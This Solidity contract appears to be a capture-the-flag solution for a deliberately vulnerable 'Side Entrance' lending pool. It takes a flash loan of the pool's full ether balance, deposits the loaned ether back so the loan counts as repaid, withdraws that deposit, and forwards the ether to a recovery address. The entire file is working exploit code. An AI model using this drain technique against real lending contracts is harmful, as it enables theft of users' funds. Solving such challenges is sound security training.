// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool sideEntranceLenderPool;
    address recovery;

    constructor(SideEntranceLenderPool _sideEntrance, address _recovery) {
        sideEntranceLenderPool = _sideEntrance;
        recovery = _recovery;
    }

    function attackSideEntrance() external {
        uint256 flashLoanAmount = address(sideEntranceLenderPool).balance;

        sideEntranceLenderPool.flashLoan(flashLoanAmount);
        sideEntranceLenderPool.withdraw();

        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }

    function execute() external payable override {
        uint256 amount = msg.value;

        sideEntranceLenderPool.deposit{value: amount}();
    }

    receive() external payable {}
}
